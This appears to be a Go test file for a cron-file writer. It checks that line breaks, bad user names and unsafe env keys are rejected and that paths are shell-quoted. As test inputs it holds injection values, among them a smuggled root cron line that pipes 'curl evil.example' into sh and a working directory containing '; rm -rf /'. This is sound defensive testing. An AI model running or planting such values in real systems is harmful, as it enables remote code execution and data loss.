package cron

import (
	"context"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

func TestWriteJobRejectsLineBreaks(t *testing.T) {
	dir := t.TempDir()
	svc := &Service{cronDir: dir}
	cases := []AddOptions{
		{ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "php artisan backup:run\n* * * * * root curl evil.example | sh", Enabled: true},
		{ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "true", Env: map[string]string{"APP_ENV": "prod\n* * * * * root /tmp/x"}, Enabled: true},
		{ID: "backup", User: "deploy\r", Schedule: "0 3 * * *", Command: "true", Enabled: true},
		{ID: "backup", User: "deploy", Schedule: "0\n3 * * *", Command: "true", Enabled: true},
		{ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "true", WorkingDir: "/srv\x00", Enabled: true},
		{ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "true", Output: "/tmp/out\n", Enabled: true},
		{ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "true", ErrorOutput: "/tmp/err\r", Enabled: true},
	}
	for _, opts := range cases {
		_, err := svc.Add(context.Background(), opts)
		if err == nil {
			t.Fatalf("expected error for %+v", opts)
		}
		if _, statErr := os.Stat(filepath.Join(dir, "abstrax-backup")); !os.IsNotExist(statErr) {
			t.Fatalf("cron file written for %+v", opts)
		}
	}
}

func TestWriteJobRejectsInvalidUserAndEnv(t *testing.T) {
	dir := t.TempDir()
	svc := &Service{cronDir: dir}
	_, err := svc.Add(context.Background(), AddOptions{
		ID: "backup", User: "deploy curl evil.example | sh #", Schedule: "0 3 * * *", Command: "true", Enabled: true,
	})
	if err == nil {
		t.Fatal("expected invalid user")
	}
	_, err = svc.Add(context.Background(), AddOptions{
		ID: "backup", User: "deploy", Schedule: "0 3 * * *", Command: "true",
		Env: map[string]string{"BAD KEY": "x"}, Enabled: true,
	})
	if err == nil {
		t.Fatal("expected invalid env key")
	}
}

func TestPercentRoundTripAndQuoting(t *testing.T) {
	dir := t.TempDir()
	svc := &Service{cronDir: dir}
	job, err := svc.Add(context.Background(), AddOptions{
		ID:         "backup",
		User:       "deploy",
		Schedule:   "0 3 * * *",
		Command:    "tar czf /backup/$(date +%F).tgz /srv",
		WorkingDir: "/srv/it's here; rm -rf /",
		Output:     "/var/log/a b.log",
		Env:        map[string]string{"ZED": "1", "APP_ENV": "prod value"},
		Enabled:    true,
	})
	if err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(job.FilePath)
	if err != nil {
		t.Fatal(err)
	}
	got := regexp.MustCompile(`created=\S+`).ReplaceAllString(string(data), "created=TIMESTAMP")
	want := `# Managed by Abstrax - do not edit manually
# abstrax:cron id=backup user=deploy created=TIMESTAMP
#
APP_ENV=prod value
ZED=1
0 3 * * * deploy cd '/srv/it'\''s here; rm -rf /' && tar czf /backup/$(date +\%F).tgz /srv > '/var/log/a b.log' 2>&1
`
	if got != want {
		t.Fatalf("file =\n%s\nwant =\n%s", got, want)
	}

	read, err := svc.Info(context.Background(), "backup")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(read.Command, "date +%F") || strings.Contains(read.Command, `\%`) {
		t.Fatalf("command = %q", read.Command)
	}
	if read.Env["APP_ENV"] != "prod value" {
		t.Fatalf("env = %#v", read.Env)
	}
}
